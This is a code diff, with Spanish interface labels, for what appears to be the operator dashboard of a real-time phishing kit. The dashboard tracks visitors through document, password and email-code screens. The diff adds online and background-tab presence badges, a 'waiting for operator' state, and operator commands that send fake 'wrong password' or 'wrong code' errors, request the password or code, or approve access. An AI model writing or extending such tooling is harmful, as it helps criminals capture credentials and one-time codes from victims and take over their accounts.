@@ -53,6 +53,10 @@
         const cur = localState.sessions.get(s.id);
         if (!cur || inMs >= (Number(cur.updatedAtMs) || 0)) {
           localState.sessions.set(s.id, s);
+        } else if (cur) {
+          cur.online = s.online;
+          cur.visibility = s.visibility || cur.visibility;
+          localState.sessions.set(s.id, cur);
         }
       }
     }
@@ -69,6 +73,34 @@
       .replace(/'/g, "&#39;");
   }
 
+  function getPresenceInfo(s) {
+    if (s.online === false) {
+      return { cls: "offline", label: "Desconectado (Salió)" };
+    }
+    if (s.visibility === "background") {
+      return { cls: "background", label: "En 2° Plano (Otra app/pestaña)" };
+    }
+    return { cls: "online", label: "En Línea (En la página)" };
+  }
+
+  function getScreenDisplay(s) {
+    if (s.screenLabel) return s.screenLabel;
+    if (s.waitingOperator) return "Pantalla: Cargando (Esperando Operador)";
+    if (s.step === "doc") return "Pantalla: Documento";
+    if (s.step === "pass") return "Pantalla: Contraseña";
+    if (s.step === "verify") return "Pantalla: Código de Correo";
+    return "Pantalla: Login";
+  }
+
+  const ACTION_LABELS = {
+    wrong_doc: "📤 Enviando error de documento...",
+    wrong_pass: "📤 Enviando error de clave...",
+    wrong_token: "📤 Enviando error de código...",
+    ask_pass: "📤 Enviando a pantalla de Clave...",
+    ask_token: "📤 Enviando a pantalla de Código...",
+    approve: "📤 Aprobando acceso al panel...",
+  };
+
   function renderSessions() {
     purgeLocalDeleted();
     const sessions = Array.from(localState.sessions.values()).sort(
@@ -76,7 +108,8 @@
     );
 
     if (countBadge) {
-      countBadge.textContent = sessions.length;
+      const onlineCount = sessions.filter((s) => s.online !== false).length;
+      countBadge.textContent = onlineCount + " / " + sessions.length;
     }
     if (!container) return;
 
@@ -92,11 +125,21 @@
       html = sessions
         .map((s) => {
           const safeId = escapeHtml(s.id);
+          const presence = getPresenceInfo(s);
+          const screenText = getScreenDisplay(s);
+          const isWaiting = Boolean(s.waitingOperator);
           return `
-      <div class="session-card" data-id="${safeId}">
+      <div class="session-card ${isWaiting ? "waiting-operator" : ""}" data-id="${safeId}">
         <div class="card-top">
-          <span class="step-pill">${escapeHtml(s.status || s.step)}</span>
+          <span class="presence-badge ${presence.cls}">
+            <span class="presence-dot"></span>
+            ${escapeHtml(presence.label)}
+          </span>
           <span class="time-info">⏰ ${escapeHtml(s.updatedAt || "")}</span>
+        </div>
+        <div class="activity-box ${isWaiting ? "is-waiting" : ""}">
+          <span class="screen-pill">📍 ${escapeHtml(screenText)}</span>
+          <span class="step-pill">${escapeHtml(s.status || s.step)}</span>
         </div>
         <div class="data-row">
           <span class="data-label">📄 ${escapeHtml(s.docType || "DNI")}</span>
@@ -179,7 +222,8 @@
 
     if (session) {
       session.lastAction = action;
-      session.status = "Operación enviada: " + action;
+      session.status = ACTION_LABELS[action] || "Operación enviada: " + action;
+      session.waitingOperator = false;
       session.pendingCommand = cmdPayload;
       session.updatedAtMs = nextMs;
       localState.sessions.set(targetId, session);
